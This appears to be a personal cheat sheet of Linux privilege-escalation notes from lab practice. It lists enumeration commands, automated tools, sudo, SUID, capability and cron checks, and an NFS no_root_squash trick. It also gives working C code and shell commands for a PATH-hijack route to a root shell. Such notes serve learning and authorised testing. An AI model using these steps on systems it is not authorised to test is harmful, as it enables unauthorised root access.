## enumeration
```bash
hostname
```

- may give information about the role of the server (`SQL-PROD-01`)

```bash
uname -a
```

- info about kernel, useful for kernel exploits!

```bash
cat /proc/version
#--
cat /etc/issue #can be changed
```

- same as above, but can have additional data such as installed compilers (gcc)

```bash
ps aux
```

- shows all system process, even of other users

```bash
env
```

- environment variables. may also be stored in `.env` files (`ls -la`)

```bash
cat /etc/passwd | grep home # or | cut -d ":" -f 1
```

- get system users

```bash
netstat -ano
# -a: all sockets
# -n: no name resolve
# -o: timers
```

## automatic enum

- [LinPeas]((https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Smart Enumeration:](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

## sudo
```bash
sudo -l
```

- shows you which binaries you may execute as root. look up the binaries on gtfo bins
- look out for `env_keep+=LD_PRELOAD`, it allows you to preload libraries which can give you root

## SUID
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

- look into gtfo bins!

## Capabilities
```bash
getcap -r / 2>/dev/null
```

- look into gtfo bins!

## CRON
```bash
cat /etc/crontab
```

- look at binaries which are executed as root, and you can write to them!

## PATH
```bash
find / -writable 2>/dev/null
```

- finds writeable folders
- if they are in `echo $PATH`, or if you can edit path via `export PATH=/tmp:$PATH`, you can create a binary which calls "thm" after modifying its own ids:

```c
#include<unistd.h>
void main(){
setuid(0);
setgid(0);
system("thm");
}
```

- last step:

```bash
echo "/bin/bash" > /tmp/thm
chmod 777 /tmp/thm
```

## NFS
```bash
cat /etc/exports
```

- look for `no_root_squash` on writeable shares!
- you can create binaries with suid bits set, and mount them on the target!